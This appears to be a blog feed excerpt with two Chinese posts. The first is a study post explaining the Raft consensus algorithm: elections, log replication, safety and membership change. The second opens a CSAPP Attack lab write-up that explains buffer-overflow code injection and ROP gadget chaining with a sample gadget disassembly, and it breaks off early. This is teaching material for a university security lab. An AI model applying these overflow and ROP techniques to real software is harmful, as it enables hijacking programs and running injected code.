    <content type="text"><![CDATA[&emsp;&emsp;Raft是著名的分布式一致性算法，学一学不会吃亏，看一看不会上当，嗯。 参考解读Raft（一 算法基础）解读Raft（二 选举和日志复制）解读Raft（三 安全性）解读Raft（四 成员变更）Raft协议处理各种failover情况通过 raft 的 leader lease 来解决集群脑裂时的 stale read 问题raft论文强烈推荐动图演示raft过程一文搞懂Raft算法raft中文翻译 &emsp;&emsp;Raft是著名的分布式一致性协议，有感于paxos在理解上和实现上的复杂程度，raft设计的初衷便是在保证一致性的同时，尽可能的简洁易懂、易于实现。下面本文将会从七个方面介绍raft算法： 算法基础 日志复制 leader选举 安全性 成员变更 客户端交互 总结 算法基础什么是分布式一致性&emsp;&emsp;当前大公司都会使用一个集群来处理相关事务。一个集群是指一群计算机的集合，在这个集群里，承担计算和记录任务的计算机统一称为server。为了防止数据丢失或者机器故障导致系统服务不可用，同一份数据会被记录到不同的server上，随之而来的便是一致性问题：如何保证多台机器上记录的数据是相同的？&emsp;&emsp;在介绍如何使得集群达成一致性之前，我们首先明确集群中server的特点。一般而言，我们可以把server假设成状态机。对于状态机而言，当输入确定时，输出也随之确定，换言之，如果多台状态机以相同顺序执行相同指令，那么他们最终达到的状态便是一致的。因此一致性问题又可以转化成，保证多台server执行的指令和执行指令的顺序是一样的。 &emsp;&emsp;Raft是管理日志的一致性算法，论文中的log代表记录任务的日志，entries可以看成是需要执行的任务或者指令，保存在log中。Raft的一致性本质上是log的一致性，只要保证集群中所有server的log相同，那么他们所执行的指令和执行指令的顺序也相同，根据状态机的理论可知，此时集群中的server保证了数据和操作的一致性。那么，Raft是如何保证log的一致性的呢？在介绍这点之前，我们首先介绍集群中server所能扮演的角色和实现raft所必需的一些数据结构。 角色在介绍raft实现log一致性的方法之前，我们首先介绍raft中server所能担任的三种角色： leader：在一个集群中，有且只有一个leader，是集群中唯一一个能与client通信的server，所有client发起的entries（任务）都必须经过leader调度，然后才同步到其他server中。 candidate：当集群中的leader宕机或者集群刚开始运行时，部分server可以将自身状态调整为candidate并竞选leader。 follower：负责相应来自leader或者candidate的请求。角色转换图如下： 角色转换规则如下： 集群中所有server在刚开启时都是follower状态。 每个follower随机化一个election timeout，如果在这个时间内没有收到来自leader的信息，则转为candidate向其他机器发送竞选请求。 一个candidate收到绝大多数节点(一般是N/2+1)的投票则转为leader；如果发现集群中存在leader或者收到更高任期的请求，则转换为follower。 如果出现网络分区，导致每个集群中存在两个leader，则网络分区恢复后，任期较低的leader转为follower。 、 任期&emsp;&emsp;raft架构中，leader与client交互并且负责log调度的时间总长称为任期，当出现各种原因导致leader宕机后，集群中选出新leader的同时更新任期的编号，一般而言，任期编号是递增的。 &emsp;&emsp;每个任期都由一次选举开始，若选举失败则这个任期内没有Leader；如果选举出了Leader则这个任期内由Leader负责集群状态管理。&emsp;&emsp;选举失败的可能原因：同时有三台机器成为candidate，并且各获得了三分之一server的支持，因为没有一个candidate得到了绝大多数(N/2+1，自己会投给自己，别把自己这一票忘了)机器的支持，所以这一次election没有选举出新的leader，结束这一轮的term。当有server的election timeout到时后，会成为新的candidate发起新一轮竞选。此时election timeout随机化的好处就体现出来了，因为每一次必定有一台机器先于其他机器结束定时并且发起leader竞选，可以防止陷入无限竞争的死循环中，。 信息交互leader和client相互交换的信息如下： 状态 状态 所有节点上持久化的状态（在响应RPC请求之前变更且持久化的状态） currentTrem 服务器的任期，初始为0，递增 votedFor 本server的投票对象（比如本节点投票给B，则votedFor=B） log[] 日志条目集，每一个条目包含一个状态机需要执行的指令，以及该指令对应的任期编号 状态 所有节点上非持久化的状态 commitIndex 最大的已经被commit的entries对应的log index lastApplied 最大的已经被应用到状态机的index 状态 Leader节点上非持久化的状态（选举后重新初始化） nextIndex[] 每个节点下一次应该接收的日志的index（初始化为leader节点最后一个entries对应的log index+1） matchIndex[] 每个节点已经复制的日志的最大索引（初始化为0，之后递增） AppendEntries RPCAppendEntries RPC是leader发送给所有follower节点的心跳信息，用来确保follower存在。当client提交新任务时，leader会通过AppndEntries来传递日志给follower。|参数|含义||:—:|:—:||term|当前Leader节点的任期||leaderId|Leader节点的ID（IP地址）||prevLogIndex|此次追加请求的上一个日志的索引||prevLogTerm|此次追加请求的上一个日志的任期||entries[]|追加的日志（空为心跳请求）||leaderCommit|leader上已经commit的entries对应的log编号| prevLogIndex和prevLogTerm表示上一次发送的日志的索引和任期，用于保证收到的日志是连续的。 返回值 含义 term 当前任期号，用于leader更新自己的任期（如果返回值的term比leader自身的任期大，表明该leader是从网络分区中恢复过来的leader，应该转为follower) success 如果follower节点匹配prevLogIndex和prevLogTerm，表明此次请求前的entries匹配，返回true 接受者逻辑： 返回false，如果收到的任期比当前任期小。 返回false，如果不包含之前的日志条目（没有匹配prevLogIndex和prevLogTerm）。 如果存在index相同但是term不相同的日志，表明该entries可能是上一个term留下的，删除从该位置开始所有的日志。 追加所有不存在的日志，用于leader同步新增加的节点。 如果leaderCommit&gt;commitIndex，将commitIndex设置为commitIndex = min(leaderCommit, index of last new entry)。（详见下面日志复制） RequestVote RPC用于candidate获取选票。|参数|含义||:—:|:—:||term|candidate的任期||candidateId|candidate的ID（类似ip地址）||lastLogIndex|candidate最后一条日志的索引||lastLogTerm|candidate最后一条日志的任期| 返回值 含义 term 当前任期，用于candidate更新自己的任期 voteGranted true表示i给candidate投票 接受者逻辑： 返回false，如果candidate发送的任期比follower当前任期小。 如果本地状态中votedFor为null或者candidateId，且candidate的日志等于或多于（按照index判断）接收者的日志，则接收者投票给candidate，即返回true。如果candidate的日志小于follower的日志，那么返回false，这样可以保证保持有较多较完整已经commit的log的follower成为新的leader。（当然，如果10台机器中，有7台机器没有commit修改，有3台机器commit了修改，最终的leader可能是那7台机器中的一台，因为他也能得到超过半数机器的支持。） 节点的执行规则所有节点 如果commitIndex &gt; lastApplied，应用log[lastApplied]到状态机，增加lastApplied。先commit，后执行，2次交互，方便回滚。 如果RPC请求或者响应包含的任期T &gt; currentTrem，将currentTrem设置为T并转换为Follower。一般是网络分区恢复后，旧leader检测到集群中的新leader，将自己修改为follower。 Follower 相应来自leader和candidate的RPC请求。 如果在选举超时周期内没有收到AppendEntries的请求或者给candidate投票，将自己转换为candidate角色。 Candidate election timeout超时后，follower将自己转为candidate。 递增currentTerm。 给自己投票。 重值election timeout（是一个随机值，一般150ms到500ms之间）。 发送RequestVote给其他所有节点。 如果收到绝大多数机器的投票，转化为leader。 如果收到Leader的AppendEntries请求，转换为follower。 如果选举超时，重新开始新一轮的选举。 Leader 一旦选举完成：发送心跳给所有节点；在空闲的周期内不断发送心跳保持Leader身份。 如果收到客户端的请求，将日志追加到本地log，在日志被应用到状态机后响应给客户端。 对于一个follower，如果其最后日志条目的索引值大于等于 nextIndex，那么，发送从 nextIndex 开始的所有日志条目： 如果成功：更新相应follower的 nextIndex 和 matchIndex。 如果因为日志不一致而失败，减少 nextIndex 重试。 如果存在一个满足N &gt; commitIndex的 N，并且大多数的matchIndex[i] ≥ N成立，并且log[N].term == currentTerm成立，那么令commitIndex等于这个N。 日志复制请求流程client发起一次修改的流程如下： leader将本次修改同步给follower，注意，此时这次修改并未写入leader的log。 follower接收到leader的修改后，将修改写入本次的log，给leader发送commit信号，但是还未执行。 leader接收到超过绝大多数（一般是N/2+1）个follower的回复，表示有绝大多数follower都同步了这条指令，于是将这条指令写入leader的log。 leader将这次修改commit给client，表明收到。 leader再次给所有follower发送信息，表明这次修改已经commit。 follower接收到leader的信息，执行这一次修改。 log matching&emsp;&emsp;Raft算法保证所有committed的日志都是持久化的（日志需要在大多数节点上持久化之后再响应给客户端，这意味着每个Follower节点收到AppendEntry请求后需要持久化到日志之后再响应给Leader），且最终会被所有的状态机执行。Raft算法保证了以下特性： 如果两个日志条目有相同的index和term，那么他们存储了相同的指令（即index和term相同，那么可定是同一条指令，就是同一个日志条目）。 如果不同的日志中有两个日志条目，他们的index和term相同，那么这个条目之前的所有日志都相同。 &emsp;&emsp;首先，leader在某一term的任一位置只会创建一个log entry，且log entry是append-only。其次，consistency check。leader在AppendEntries中包含最新log entry之前的一个log 的term和index，如果follower在对应的[term,index]找不到相应的日志，那么就会告知leader不一致。leader稍后会修改nextIndex后重发appendEntries，重复这个过程，直到找到follower与leader匹配的entry为止。 &emsp;&emsp;两条规则合并起来的含义：两个日志LogA、LogB，如果LogA[i].index==LogB[i].index且LogA[i].term==LogB[i].term，那么LogA[i]==LogB[i]，且对于任何n &lt; i的日志条目，LogA[n]==LogB[n]都成立。（这个结论显而易见的可以从日志复制规则中推导出来）。 这两条特性是通过prevLogIndex、prevLogTerm和nextIndex，以及新的term阶段，leader覆盖folower的日志来保证的。 &emsp;&emsp;日志组织形式如上图所示，每个日志条目中包含可执行的指令,和日志被创建时的任期号，日志条目也包含了自己在日志中的位置，即index。根据raft的保证，不同server上相同log编号和相同任期的entries必定是相同的。可以把任期看成是国号，比如唐宋元明清，log编号看成是公元历，entries看成是皇帝，一个任期（国号）内有许多个entries（皇帝），当leader宕机后，这个任期结束，新的任期开始。任期之间有先后关系，比如宋在唐之后，以此来确定任期之间的优先级（越往后越高级），同时他们也有对应的公元年编号。根据任期编号（唐）和公元年编号（731年）可以判断出，这个entries（皇帝）是唐玄宗。 问题：参考Raft协议处理各种failover情况&emsp;&emsp;看完参考链接之后，自己写博客时，可以针对客户提交一次修改的流程，穷举所有机器故障的情况，并尝试回答raft是如何保持一致性的状态，借此可以检验自己是不是真的理解了。 如果这次修改没有得到超半数的follower回应怎么办？ 答：对于已经将本次修改写入log的少数follower，会根据下一次leader发送的appendEntries信息中的prevLogIndex、prevLogTerm和LeaderCommit来回滚数据。 如果leader接收到client的修改，但是还未给follower发出修改就宕机了怎么办？ 答：此时剩下的机器处于一致性的状态，election timeout超时后会重新选出新的leader，client在没有接收到leader的回复时，会再次发出请求。 如果所有follower都接收到修改请求，但是leader宕机怎么办？ 答：此时follower中的log保持一致性的状态，重新选出新的leader即可。 如果只有部分follower接收到修改请求，但是leader宕机怎么办？ 答：有两种可能。&emsp;&emsp;第一，如果超过半数follower已经接受了修改请求，那么根据raft选举leader的规则，必然是写入了新请求的follower成为新的leader（详见下面leader选举）。选出新leader后，会将本次修改同步到其余未接到修改请求的follower。因为raft要求client的修改请求拥有幂等性，也就是会自动去除重复的请求，所以leader直接commit本次修改即可。&emsp;&emsp;第二，如果只有小部分（小于N/2+1）follower接收到修改请求，那么会产生一种不确定的状态。此时有可能是接收到请求的follower成为新的leader，就和第一种可能一样；但是也有可能是没有接收到请求的follower成为新的leader，此时新的leader会要求接收到请求的follower回滚log。然后新的leader会接收到client的请求，重复执行修改的流程。 如果出现了网络分区，并且旧的leader在少数机器那一部分分区中？ 答：此时占绝大多数机器的分区会重新决出leader，然后根据1234的情况执行策略。等网络分区回复，旧leader发现存在新leader后，将自己变为follower（appendEntries的返回值）。 一次修改中，leader和follower需要进行两次信息交互，第一次是follower commit，第二次是follower执行指令，如果所有follower都commit了指令，但是leader宕机时，有的follower执行了修改请求，有的没有执行，怎么办？ 答：请注意，raft是更改日志的一致性协议，重点在于日志上，而不在于是否执行上。只要修改存在于日志中，那就会执行，若不存在就不执行，由lastApplied来记录最后一个执行的指令，就这么简单。因此是否执行可以转化为是否commit，而是否commit就是前面1-5的情况。 leader选举选举流程&emsp;&emsp;leader通过发送appendEntries来保持leader的角色。每个follower在收到一个appendEntries（心跳信号，有时也附加修改请求）后，会随机初始化election timeout，如果在timeoue之内没有接收到来自leader的心跳信号，该follower会认为leader已经宕机，自身转为candidate状态开始竞选leader。选举流程如下： Follower递增自己的任期并设置为Candidate角色。 投票给自己并且随机初始化新的election timeout。 并发的给所有节点发送投票请求。 保持Candidate状态直到： 同一个任期内获得大多数选票，成为Leader（一个节点在一个任期内只能给一个Candidate投票，任期相同则选票先到先得）并给其他节点发送心跳来保持自己的角色。 收到其他节点的RPC请求，如果请求中的任期大于等于Candidate当前的任期，认为其他节点成为了Leader，自身转换为Follower；如果其他节点的任期小于自身的任期，拒绝RPC请求并保持Candidate角色。 election timeout超时后仍旧没出现Leader（可能是出现了平票的情况），则重新发起新一轮选举（递增任期、发送投票请求）。 &emsp;&emsp;为了避免平票的问题，同时在出现平票的情况后能快速解决，Raft的选举超时时间是在一个区间内随机选择的（150~300ms）。这样尽量把服务器选举时间分散到不同的时间，保证大多数情况下只有一个节点会发起选举。在平票的情况下，每个节点也会在一个随机时间后开始新一轮选举，避免可能出现的一直处于平票的情况。 异常处理 一个新Leader被选举出来时，Follower可能是上图中的任何一种情况。 (a)(b)可能还没复制到日志。 (c)(d)可能曾经是Leader，所有包含了多余的日志（这些日志可能被提交了，也可能没提交）。 (e)可能是成为Leader之后增加了一些日志，但是在Commit之前又编程了Follower角色，且还没有更新日志条目。 (f)可能是在任期2称为了Leader并追加了日志但是还没提交就Crash了，恢复之后在任期3又成了Leader并且又追加了日志。 在Raft中，通过使用Leader的日志覆盖Follower的日志的方式来解决出现像上图的情况（强Leader）。Leader会找到Follower和自己想通的最后一个日志条目，将该条目之后的日志全部删除并复制Leader上的日志。详细过程如下： Leader维护了每个Follower节点下一次要接收的日志的索引，即nextIndex。 Leader选举成功后将所有Follower的nextIndex设置为自己的最后一个日志条目+1。 Leader将数据推送给Follower，如果Follower验证失败（nextIndex不匹配），则在下一次推送日志时缩小nextIndex，直到nextIndex验证通过。 leader同步follower的log的做法是，用leader的log覆盖follower的log，但不是单纯的把leader所有的log发给follower，因为这不现实，一般系统运行一段时间后，log非常非常大，传输整个log极其占带宽。相反，raft选择从最新确认的entry开始回溯对比，找到第一个不匹配的entry编号，然后用leader的log覆盖follower那一点之后所有的log记录。 安全性选举限制&emsp;&emsp;在Raft协议中，所有的日志条目都只会从Leader节点往Follower节点写入，且Leader节点上的日志只会增加，绝对不会删除或者覆盖。&emsp;&emsp;这意味着Leader节点必须包含所有已经提交的日志，即能被选举为Leader的节点一定需要包含所有的已经提交的日志。因为日志只会从Leader向Follower传输，所以如果被选举出的Leader缺少已经Commit的日志，那么这些已经提交的日志就会丢失，显然这是不符合要求的。&emsp;&emsp;这就是Leader选举的限制：能被选举成为Leader的节点，一定包含了所有已经提交的日志条目。&emsp;&emsp;回看算法基础中的RequestVote RPC：|参数|含义||:—:|:—:||term|candidate的任期||candidateId|candidate的ID（类似ip地址）||lastLogIndex|candidate最后一条日志的索引||lastLogTerm|candidate最后一条日志的任期| 返回值： |参数|含义||term|当前任期，用于candidate更新自己的任期||votedFor|本server的投票对象（比如本节点投票给B，则votedFor=B）| 请求中的lastLogIndex和lastLogTerm即用于保证Follower投票选出的Leader一定包含了已经被提交的所有日志条目： Candidate需要收到超过半数的节点的选票来成为Leader。 已经提交的日志条目至少存在于超过半数的节点上。 那么这两个集合一定存在交集（至少一个节点），且Follower只会投票给日志条目比自己的“新”的Candidate，那么被选出的节点的日志一定包含了交集中的节点已经Commit的日志。 &emsp;&emsp;日志比较规则（即上面“新”的含义）：Raft 通过比较两份日志中最后一条日志条目的索引值和任期号定义谁的日志比较新。如果两份日志最后的条目的任期号不同，那么任期号大的日志更加新。如果两份日志最后条目的任期号相同，那么日志比较长的那个就更加新。 日志提交限制 上图按时间序列展示了Leader在提交日志时可能会遇到的问题: 在(a)中，S1是Leader，任期为2，索引位置2的日志条目仅缓存在S2上。 在(b)中，S1崩溃了，然后S5在任期3里通过S3、S4和自己的选票赢得选举，然后从客户端接收了一条不一样的日志条目放在了索引2处。 然后到(c)，S5又崩溃了；S1重新启动，选举成功，复制索引2处的日志到S3。这时，来自任期2的那条日志已经被复制到了集群中的大多数机器上，但是还没有被提交。 如果S1在(d)中又崩溃了，且S5重新被选举成功（通过来自S2，S3和S4的选票，因为S5索引处的日志是任期3，大于S234索引2处的任期2。），然后覆盖了他们在索引2处的日志。反之，如果在崩溃之前，S1把自己主导的新任期里产生的日志条目复制到了大多数机器上，就如(e)中那样，那么在后面任期里面这些新的日志条目就会被提交（因为S5就不可能选举成功）。 这样在同一时刻就同时保证了，之前的所有老的日志条目都会被提交。 出现上图(c，d)情况，造成已经被大多数（超过N/2+1）个节点commit的log（可能已经执行了）回滚的原因是，在term4中仅仅是复制了term2的entry。因此，在(c)S1宕机之后，因为S5最后一个entry的term大于S2,S3的term，使得S5竞选成功并且覆盖已经被大多数节点commit了的term2信息。 Raft never commits log entries from previous terms by counting replicas.Only log entries from the leader’s current term are committed by counting replicas; once an entry from the current term has been committed in this way, then all prior entries are committed indirectly because of the Log Matching Property. &emsp;&emsp;raft对此的解决方案是，每一个新的任期内，不会只同步之前任期的日志，而是在同步当前任期日志的同时同步之前任期的日志。什么意思呢？比如上图，在(c)处，进入term4之后，S1不会只同步之前term2的日志，而是会在同步term4的日志的同时，顺便同步term2的日志，这样一来就会变成(e)的情况，而(c)中的情况，只同步了term2却没有同步term4日志的情况根本就不会发生。因此，在raft下，在上图(b)之后，如果S1再次成为leader，进入term4，此时S1开始同步term4的日志，就会变成图(e)的情况，根本不会出现(c)的情况。如果S1在此之后挂了，S5根本不可能成为新的leader，因为S5最后一个日志的term小于S2S3的term。 问题来了，如果进入新任期后，没有收到client新的信息呢？此时没有日志需要同步，连带着此前term的日志也不会同步。raft的解决方法是，在进入新任期后，立即同步一个为空的日志。这样就可以带动之前未同步的日志进行同步了。 stale leader&emsp;&emsp;网络分区后，在少部分机器中的旧leader，因为得不到超过半数机器的commit，所以不能执行任何写请求。但是，可以执行读请求，这时候有可能会返回已经过期的信息。解决方法是通过 raft 的 leader lease 来解决集群脑裂时的 stale read 问题。 成员变更初步理解&emsp;&emsp;以上leader选举、日志复制和安全性的分析都是建立在集群中server总数不变的前提下的。然而，众所周知，在集群真正运行过程中，会有机器不停的离开集群，也会不停地往集群中加入新的机器。因此，成员变更也是一致性算法至关重要的组成部分。注意，成员变更和由于故障或者重启导致的server上下线不同，成员变更是会改变系统注册的成员数量，影响“绝大多数”这一概念的判定，也就影响leader选举和commit的成败。 &emsp;&emsp;成员变更有许多种方法，然而不论是哪一种方法，都需要先将新成员加入到集群中，让集群中其他机器了解到新成员的存在，然后将集群中的日志复制给新成员，保持和leader的一致性。一种最直接的实现方法，就是在新成员加入时，停止集群的运行，待将集群中的日志完全复制到新成员后，再重新启动新集群。这种方法缺点很明显，会在新成员加入时使得集群不可用。 声明：网上的各种博客千篇一律，基本都是将原文翻译了一遍，然而说的都不太明白。这里仅仅是我刚看完论文和网上博客后的粗浅理解，不准确，等我做完lab2，有了实践经验再回来补充。 首先明确成员变更的含义，新加入的server不止一台，同时成员更新不仅意味着加入新的机器，也意味着删掉旧的机器（所以当前的leader有可能是位于要删掉的机器列表中）。此时显而易见的问题是，我们如何让新集群中的机器知道新集群有哪些机器（用于竞选leader）？ 论文中的“配置”，可以看成是“集群中运行的机器集合”。 Raft提出了一种过渡阶段，joint consensus，用于逐步同步旧集群中的数据到新集群中去。在joint consensus状态下，集群有如下特性： 日志被提交给新老配置下所有的节点。 新旧配置中所有机器都可能称为Leader。 达成一致（选举和提交）要在两种配置上获得超过半数的支持。 具体切换过程如下： Leader收到C-old到C-new的配置变更请求时，创建C-old-new的日志并开始复制给其他节点（和普通日志复制没有区别）。 Follower以最新的配置做决定（收到C-old-new后就以C-old-new来决定），Leader需要以已经提交的配置来做决定（即只有C-old-new复制到大多数节点后Leader才以这个配置做决定）；这个时候处于一个共同决定的过程。 之后提交C-new到所有节点，一旦C-new被提交，旧的配置就无所谓了。 要明白raft的成员变更，只需要弄明白C-old和C-new的含义，C-old-new和C-new发送的时机和commit的时机，然而网上博客都说得挺含糊的。 这里有几个注意的地方,首先C-old-new和C-new就是普通的写入log的日志，其作用是通知收到该日志的机器，现在集群开始进入成员变更状态。而C-new这条日志的作用在于，告诉新集群中的机器，成员变更完毕。我们假设： 旧集群机器集合为S 旧集群中需要下线的机器集合为D，D是S的一个子集 旧集群中保留到新集群的机器为U=S-D 新加入的机器集合为N 显而易见，新集群T=S+N-D &emsp;&emsp;我们来思考一下，为什么C-old-new需要持续一段时间呢？我的理解是，由于新加入的机器不止一台，因此新集群的加入是一个过程的。我们需要通知旧集群中保留的机器U，新集群的机器数量和联系方式（比如IP地址）；同样的，我们需要告诉新集群N，旧集群中保留下来的机器集合U的联系方式，这是一个过程，不是一蹴而就。 &emsp;&emsp;而此时leader的作用在于统计有哪些机器已经知道了新集群。当一台机器commit了C-old-new时，leader就明白这台机器已经知道开始成员变更了，等到大多数都回复C-old-new时，leader就知道新集群中的机器大部分都知道了新伙伴的地址，于是leader就commit C-old-new指令（所以在成员变更时，leader应该会知道新加入的机器有多少台？不然怎么判断“绝大多数”这个概念），当leader收到所有新集群的机器的C-old-new时（？不确定是不是收到所有，论文和网上博客都说不明白什么时候发送C-new），leader判断新集群的所有节点都知道了新集群的存在和彼此的联系方式，然后就发送C-new指令，告知新集群，正式启用新集群。然后收到半数commit之后，正式转为新集群。如果leader是处于要下线的机器集合D中，那么leader在commit C-new之后就下线，新集群开始新的leader竞选。 &emsp;&emsp;commit Cnew后，表示新集群中的机器都相互认识了，正式开始使用新集群，旧集群就不管了。 成员变更的问题大部分来自于这里 如果当前leader是处于要下线的集合中怎么办？ 答：当前leader发送C-old-new和C-new，当commit C-new之后下线即可。注意，如果leader是下线的机器，那么C-old-new中做决定时，“绝大多数”不包含他自身。 如果leader crash怎么办？ 答：要分C-old-new和C-new两个阶段，每个阶段又分两种情况，但是都一样的，以C-new阶段为例：&emsp;&emsp;第一种情况是C-new指令已经分发到大多数节点上，此时leader挂掉，开始新一轮竞选，显然，根据raft竞选限制，只有含有C-new指令的机器才能成为新的leader，然后继续C-new就行。&emsp;&emsp;第二种情况是C-new指令只分发到少部分节点上，这时候含有C-new和不含有C-new的节点都有可能成为leader，含有C-new的节点成为leader和第一种情况一样；另一种情况则是发现C-old-new已经commit了，重新开始C-new即可，结果和第一种情况一样。 旧节点下线后收不到心跳信息，触发选举，发送请求给C-old-new中的节点怎么办？ 答：为了防止删除掉的机器因接收不到leader的心跳而开启竞选。follower将会忽略在接收到leader心跳信息后，第一个election timeout内的竞选请求。换言之，之前的设计是，follower在一个election timeout后，变成candidate竞选；现在是一个timeout后，再开始新的timeout，第二个timeout超时才会竞选，并且在第二个timeout内收到竞选请求才会投票，在第一个timeout内收到的竞选请求则会忽略。只要减少election timeout的选择范围，就不影响正常的竞选。比如原来的timeout是10s，现在将timeout改为5s，貌似不会影响。&emsp;&emsp;现在仔细想想，之前还挺容易竞争的。如果因为一点延迟，使得AppendEntries没有到达一个follower，但是其他节点都收到心跳信息。此时这个没收到信息的follower变成集群中新的且是唯一的candidate，并且其term还大于当前的leader，那这个节点不就能很快竞选为新的leader了吗。也就是说，如果有一点网络延迟造成某个节点收不到心跳信息但其他节点都收到了，那就会造成一次term切换。所以系统是建立在几乎不会丢失心跳信息上的？或者是election timeout远大于一个心跳时间，保证election timeout大于多个心跳信号？ The broadcast time should be an order of magnitude less than the election timeout so that leaders can reliably send the heartbeat messages required to keep followers from starting elections; 果然原文中也表示心跳时间要比选举时间小一个数量级。 新的服务器没有任何数据，加入进来进来怎么保证系统的可用性（这个时候新日志没办法Commit就没办法响应给客户端）？ 答：新加入的节点需要时间复制数据，在这个过程完成之前，Raft采用以下机制来保证可用性：新加入节点没有投票权（Leader复制日志给他们，但是不将他们考虑在机器数量里面——即在判断是否超过半数时不把这些节点考虑在内），直到这些节点的日志追上其他节点。 客户端交互以下来自这里Raft 中的客户端发送所有请求给领导人。当客户端启动的时候，他会随机挑选一个服务器进行通信。 如果选择的服务器是领导者，那么客户端会把请求发到该服务器上。 如果选择的服务器不是领导者，该服务器会把领导者的地址告诉给客户端，后续客户端会把请求发给该领导者。 如果此时没有领导者，那么客户端会timeout，客户端会重试其他服务器，直到找到领导者。 &emsp;&emsp;Raft的目标是要实现线性化语义（每一次操作立即执行，只执行一次，在他调用和收到回复之间）。但是，如上述，Raft是可以执行同一条命令多次的：例如，如果领导人在提交了这条日志之后，但是在响应客户端之前崩溃了，那么客户端会和新的领导人重试这条指令，导致这条命令就被再次执行了。解决方案就是客户端对于每一条指令都赋予一个唯一的序列号。然后，状态机跟踪每条指令最新的序列号和相应的响应。如果接收到一条指令，它的序列号已经被执行了，那么就立即返回结果，而不重新执行指令。 只读的请求可以不写log就能执行，但是它有可能返回过期的数据，有如下场景： 首先，领导人必须有关于被提交日志的最新信息。领导人完全特性保证了领导人一定拥有所有已经被提交的日志条目，但是在他任期开始的时候，他可能不知道那些是已经被提交的。为了知道这些信息，他需要在他的任期里提交一条日志条目。Raft 中通过领导人在任期开始的时候提交一个空白的没有任何操作的日志条目到日志中去来实现。 第二，领导人在处理只读的请求之前必须检查自己是否已经被废黜了（他自己的信息已经变脏了如果一个更新的领导人被选举出来）。Raft中通过让领导人在响应只读请求之前，先和集群中的大多数节点交换一次心跳信息来处理这个问题。可选的，领导人可以依赖心跳机制来实现一种租约的机制，但是这种方法依赖时间来保证安全性（假设时间误差是有界的）。 总结&emsp;&emsp;Raft简洁易懂，易于实现。看完论文后不知所云，上网读完博客后若有所悟，自己写（chao）一遍博客后豁然开朗。在写博客的过程中，会将网上博客和原文相互印证，思考背后的涵义，提出自己的见解。然而这终究是纸上谈兵，如雾里看花、隔靴骚扰，咋一看似乎能将原理说的头头是道，但往里深思还是不甚了了。分布式一致性问题是从工程中来，要想真正理解一致性的算法，也要到工程里去，做一下lab2，也许对raft会有更多的见解。 回到顶部]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSAPP-lab3-Attack]]></title>
    <url>%2F2019%2F05%2F22%2FCSAPP-lab3-Attack%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本次实验是CSAPP第三个lab：Attack，在实验2的基础上更进一步，不但需要分析汇编代码，还需要分析栈帧内容，通过栈溢出来注入攻击代码。通过本次实验，我们可以更加清晰的认识到缓冲区溢出的危害，了解如何利用栈帧漏洞更改程序跳转地址，以执行恶意代码，修改程序功能。 &emsp;&emsp;实验要求：阅读《深入理解计算机系统（第三版）》的3.10.3~3.10.4。&emsp;&emsp;参考：CSAPP:Attack lab&emsp;&emsp;说明：WriteUp 前置知识本次实验一共介绍了两种最基本的利用缓冲区溢出入侵程序的手段：注入代码和ROP。 注入代码入侵&emsp;&emsp;C语言中，执行函数时会分配栈帧空间并更改栈顶位置，与此同时，所有函数申请的局部变量，都会保存在分配到的栈帧中。而在本函数的栈帧空间之上，就是调用本函数的caller的返回地址。由于C语言中缺少对数组边界的检查，这意味着，如果我在一个函数中申请一个数组，然而我输入的数据大于数组的长度，那么多出来的数据将会覆盖其余的栈帧内容！ &emsp;&emsp;一般意义下的缓存溢出漏洞就是发生了上述的情况。程序接收了大于数组长度的数据，而多出来的数据覆盖了栈帧上的其他内容，比如返回地址。这样一来，只要精心计算一下栈中各部分代码的空间分配位置，就能用注入代码地址覆盖函数返回地址，强迫程序完成后跳转到注入代码的位置，执行非法代码！ ROP攻击&emsp;&emsp;缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。 栈随机化：栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。 栈破坏检测：最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。 限制可执行代码区域：最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。 &emsp;&emsp;在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。如图所示： &emsp;&emsp;每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。比如有这么一段代码：1234void setval_210(unsigned *p)&#123; *p = 3347663060U;&#125; 汇编后得到：1230000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq &emsp;&emsp;仔细观察代码，可以看到字节序列恰好是指令movq %rax, %rdi的编码，因此，如果程序跳转到地址0x400f18处，就能执行寄存器赋值操作。因此，当栈帧代码不可执行时，我们需要想办法在已有的字节码中找到我们所需要的字节码片段，然后将字节码的地址插入的栈帧中，通过ret实现前后代码的跳转。比如我找到了三段gadget代码，地址分别是ABC，那么我把ABC的地址放在相邻的栈帧中。首先函数返回ret跳转到A地址处，跳转之后rsp自动+8，此时rsp指向地址B，当A处指令执行完，调用ret，此时跳转到B指向的代码处，此时rsp继续+8，rsp指向地址C。以此类推，通过ret来控制程序执行。具体字节编码和汇编语句的映射关系可以查看这里（回忆一下，ret指令是获取当前rsp寄存器的值当做地址来跳转，然后rsp+8） &emsp;&emsp;本次实验需要按要求“攻击”5次给定程序，前三次是注入代码攻击，后两次是ROP攻击。 Ctarget-level-1注意如果输入1./ctarget 不能执行，那么请在后面加上-q参数：1./ctarget -q 问题描述假如在可执行文件CTARGET中，有一个负责读取键盘输入，并将数据存入到栈帧空间的函数getbuf：1234561 unsigned getbuf()2 &#123;3 char buf[BUFFER_SIZE];4 Gets(buf);5 return 1;6 &#125; 该函数被test函数调用：1234561 void test()2 &#123;3 int val;4 val = getbuf();5 